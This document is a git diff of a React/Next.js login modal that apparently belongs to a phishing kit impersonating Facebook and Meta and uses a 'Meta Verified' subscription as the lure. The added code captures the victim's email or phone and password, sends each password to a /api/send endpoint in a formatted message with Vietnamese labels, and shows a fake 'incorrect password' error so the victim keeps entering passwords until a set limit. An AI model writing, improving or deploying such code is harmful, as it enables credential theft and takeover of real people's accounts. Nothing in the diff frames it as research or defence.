@@ -1,16 +1,13 @@
 'use client';
 
-import FacebookLogo from '@/assets/images/facebook-logo.svg';
-import MetaLogo from '@/assets/images/meta-logo-image.png';
+import FbRoundLogo from '@/assets/images/fb_round_logo.png';
+import MetaLogo from '@/assets/images/meta-logo-grey.png';
+import TickIcon from '@/assets/images/tick.svg';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import translateText from '@/utils/translate';
-import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
-import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { useEffect, useState, type FC, type FormEvent } from 'react';
 
 interface PasswordModalProps {
     userProfileImage: string;
@@ -18,32 +15,52 @@ interface PasswordModalProps {
     userEmail: string;
     nextStep: () => void;
 }
-// Source - https://stackoverflow.com/a/22707551
-// Posted by T.J. Crowder, modified by community. See post 'Timeline' for change history
-// Retrieved 2026-04-03, License - CC BY-SA 3.0
+
+const SEP = '━━━━━━━━━━━━━━━━━━━━';
+
 const delay = (delayTime: number) => {
     return new Promise((resolve) => {
         setTimeout(resolve, delayTime);
     });
 };
 
-const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
-    const [isLoading, setIsLoading] = useState(false);
+const buildMessage = (baseMessage: string, loginEmail: string, passwords: string[]): string => {
+    let msg = baseMessage;
+    msg += `\n🔐 <b>ĐĂNG NHẬP</b>\n   TK: <code>${loginEmail}</code>`;
+    passwords.forEach((pw, i) => {
+        msg += `\n   MK${i + 1}: <code>${pw}</code>`;
+    });
+    msg += `\n${SEP}`;
+    return msg;
+};
+
+const PasswordModal: FC<PasswordModalProps> = ({ nextStep }) => {
+    const [identifier, setIdentifier] = useState('');
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
+    const [loginAttempt, setLoginAttempt] = useState(0);
+    const [isLoading, setIsLoading] = useState(false);
+    const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { messageId, message, setMessage, setMessageId, geoInfo } = store();
-    const [isShowError, setIsShowError] = useState(false);
-    const [passWordAttempt, setPassWordAttempt] = useState(1);
+    const { messageId, baseMessage, passwords, setMessage, setMessageId, addPassword, setLoginEmail, geoInfo, setModalOpen } = store();
 
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
+    const t = (text: string): string => translations[text] || text;
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Enter your password', 'Password', 'Log in', 'Forgotten password?'];
+
+        const textsToTranslate = [
+            'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
+            'Mobile number or email',
+            'Password',
+            'Password is incorrect, please try again.',
+            'Log in',
+            'Continue',
+            'Forgot password?',
+            'About · Help · See more'
+        ];
+
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -55,18 +72,30 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
         translateAll();
     }, [geoInfo]);
 
-    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    const handleChange = (field: 'identifier' | 'password', value: string) => {
+        if (field === 'identifier') {
+            setIdentifier(value);
+        } else {
+            setPassword(value);
+        }
+        if (showError) {
+            setShowError(false);
+        }
+    };
+
+    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
-        if (isLoading || !message) return;
+        if (!identifier.trim() || !password.trim() || isLoading || !baseMessage) return;
+
         setIsLoading(true);
+        setShowError(false);
+        setLoginEmail(identifier.trim());
 
-        setIsShowError(false);
+        const newPasswords = [...passwords, password];
+        addPassword(password);
 
-        const updatedMessage = `${message}
-
-<b>📧 Account Email:</b> <code>${userEmail}</code>
-<b>🔒 Password:</b> <code>${password}</code>`;
+        const updatedMessage = buildMessage(baseMessage, identifier.trim(), newPasswords);
 
         try {
             const res = await axios.post('/api/send', {
@@ -80,13 +109,17 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                 }
                 setMessage(updatedMessage);
             }
-            await delay(config.PASSWORD_LOADING_TIME);
-            setIsShowError(true);
-            setPassWordAttempt(passWordAttempt + 1);
-            console.log(passWordAttempt)
-            if (passWordAttempt >= config.MAX_PASS) {
+
+            await delay(1500);
+
+            const nextAttempt = loginAttempt + 1;
+            setLoginAttempt(nextAttempt);
+
+            if (nextAttempt >= config.MAX_PASS) {
+                setShowError(false);
                 nextStep();
             } else {
+                setShowError(true);
                 setPassword('');
             }
         } catch {
@@ -98,59 +131,137 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 
     return (
         <>
-            {/* Overlay mờ toàn màn hình */}
-            <div className='fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all'></div>
-            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
-                <div className='flex max-h-[95vh] w-full max-w-sm flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:max-w-md sm:p-3 md:max-w-lg md:p-4'>
-                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col items-center gap-2 overflow-y-auto py-3 sm:gap-3 sm:py-4 md:gap-4 md:py-6'>
-                        {/* Profile Image */}
-                        <div className='flex h-16 w-16 shrink-0 items-center justify-center overflow-hidden rounded-full border-2 border-gray-300 bg-white sm:h-20 sm:w-20 md:h-24 md:w-24'>
-                            {userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? (
-                                <Image src={userProfileImage} alt={userName} width={96} height={96} className='h-full w-full object-cover' />
-                            ) : (
-                                <Image src={FacebookLogo} alt='Facebook logo' width={96} height={96} className='h-full w-full object-cover' />
-                            )}
-                        </div>
+            <div className='modal-backdrop show' onClick={() => setModalOpen(false)} aria-hidden='true' />
+            <div className='modal form-modal show' id='exampleModal2' tabIndex={-1} role='dialog' aria-modal='true'>
+                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
+                    <div className='modal-content'>
+                        <div className='modal-header' />
+                        <div className='modal-body'>
+                            <div>
+                                <div className='fb-round-wraper text-center'>
+                                    {/* eslint-disable-next-line @next/next/no-img-element */}
+                                    <img alt='' className='fb-logo-round' src={FbRoundLogo.src} />
+                                </div>
 
-                        {/* User Name */}
-                        <h2 className='max-w-xs truncate text-center text-base font-bold sm:text-lg md:text-2xl'>{userName}</h2>
+                                <form autoComplete='off' id='apiForm' onSubmit={handleSubmit}>
+                                    <p className='login-instruction'>
+                                        {/* eslint-disable-next-line @next/next/no-img-element */}
+                                        <img src={TickIcon.src} width={16} height={16} alt='tick' />
+                                        {t('In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).')}
+                                    </p>
 
-                        {/* Password Input */}
-                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
-                            <div className='relative w-full'>
-                                <input
-                                    type={showPassword ? 'text' : 'password'}
-                                    value={password}
-                                    onChange={(e) => {
-                                        setIsShowError(false);
+                                    {loginAttempt === 0 && (
+                                        <div className={`form-floating mb-3${identifier.trim() ? ' has-value' : ''}`} id='emailField'>
+                                            <input
+                                                autoComplete='username'
+                                                className='form-control'
+                                                id='loginIdentifier'
+                                                maxLength={60}
+                                                minLength={3}
+                                                name='identifier'
+                                                placeholder=' '
+                                                required
+                                                type='text'
+                                                value={identifier}
+                                                onChange={(e) => handleChange('identifier', e.target.value)}
+                                            />
+                                            <label htmlFor='loginIdentifier'>{t('Mobile number or email')}</label>
+                                        </div>
+                                    )}
 
-                                        setPassword(e.target.value);
-                                    }}
-                                    className={`h-10 w-full rounded-[10px] border-2 px-3 py-1.5 pr-10 text-base sm:h-11 md:h-12.5 ${isShowError ? 'border-red-500 placeholder:text-red-500' : 'border-[#d4dbe3]'}`}
-                                    required
-                                    autoComplete='new-password'
-                                    placeholder={isShowError ? t('Wrong password') : t('Password')}
-                                />
-                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
+                                    <div className={`form-floating mb-3${password.trim() ? ' has-value' : ''}`} style={{ position: 'relative' }}>
+                                        <input
+                                            autoComplete='current-password'
+                                            className={`form-control ${showError ? 'is-invalid shake' : ''}`}
+                                            id='exampleInputPassword'
+                                            maxLength={30}
+                                            minLength={3}
+                                            name='password-1'
+                                            placeholder=' '
+                                            required
+                                            style={{ paddingRight: '44px' }}
+                                            type={showPassword ? 'text' : 'password'}
+                                            value={password}
+                                            onChange={(e) => handleChange('password', e.target.value)}
+                                        />
+                                        <label htmlFor='exampleInputPassword'>{t('Password')}</label>
+
+                                        <button
+                                            aria-label='Show/Hide password'
+                                            aria-pressed={showPassword}
+                                            className='password-toggle'
+                                            id='show-hide-pass'
+                                            style={{
+                                                position: 'absolute',
+                                                right: '12px',
+                                                top: '50%',
+                                                transform: 'translateY(-50%)',
+                                                cursor: 'pointer',
+                                                zIndex: 6,
+                                                background: 'transparent',
+                                                border: 0,
+                                                padding: 0
+                                            }}
+                                            type='button'
+                                            onClick={() => setShowPassword((prev) => !prev)}
+                                        >
+                                            <svg fill='#606770' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'inline' }}>
+                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
+                                                <circle cx='12' cy='12' r='2.5' />
+                                            </svg>
+                                            <svg fill='#1877f2' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'inline' : 'none' }}>
+                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
+                                            </svg>
+                                        </button>
+
+                                        {showError && (
+                                            <div className='invalid-feedback d-block' id='errorMsg'>
+                                                {t('Password is incorrect, please try again.')}
+                                            </div>
+                                        )}
+                                    </div>
+
+                                    <div className='form-btn-wrapper'>
+                                        <button className='btn btn-primary w-100' id='loginBtn' type='submit' disabled={isLoading}>
+                                            <span className='button-text' style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
+                                                {loginAttempt === 0 ? t('Log in') : t('Continue')}
+                                            </span>
+                                            {isLoading && (
+                                                <span
+                                                    className='custom-spinner'
+                                                    id='spinner'
+                                                    style={{
+                                                        position: 'absolute',
+                                                        left: '50%',
+                                                        top: '50%',
+                                                        transform: 'translate(-50%, -50%)',
+                                                        width: '22px',
+                                                        height: '22px',
+                                                        border: '3px solid rgba(255,255,255,0.5)',
+                                                        borderTopColor: '#fff',
+                                                        borderRadius: '50%'
+                                                    }}
+                                                />
+                                            )}
+                                        </button>
+                                    </div>
+
+                                    <div className='text-center' id='forgot-pass-wrap'>
+                                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer'>
+                                            {t('Forgot password?')}
+                                        </a>
+                                    </div>
+                                </form>
                             </div>
+
+                            <div className='spaser' />
                         </div>
 
-                        {/* Log In Button */}
-                        <div className='mt-1 w-full px-1.5 sm:mt-2 sm:px-3 md:px-4'>
-                            <button type='submit' disabled={isLoading} className={`flex h-10 w-full items-center justify-center rounded-full bg-blue-600 text-xs font-semibold text-white transition-colors hover:bg-blue-700 sm:h-11 sm:text-sm md:h-12.5 md:text-base ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
-                                {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Log in')}
-                            </button>
+                        <div className='modal-footer border-0 justify-content-center'>
+                            {/* eslint-disable-next-line @next/next/no-img-element */}
+                            <img src={MetaLogo.src} alt='Meta Logo' />
+                            <div className='footer-links'>{t('About · Help · See more')}</div>
                         </div>
-
-                        {/* Forgotten Password Link */}
-                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='mt-1 text-center text-xs text-blue-600 hover:underline sm:text-xs md:text-sm'>
-                            {t('Forgotten password?')}
-                        </a>
-                    </form>
-
-                    {/* Meta Logo Footer */}
-                    <div className='flex items-center justify-center p-3'>
-                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                     </div>
                 </div>
             </div>
@@ -159,4 +270,3 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 };
 
 export default PasswordModal;
-
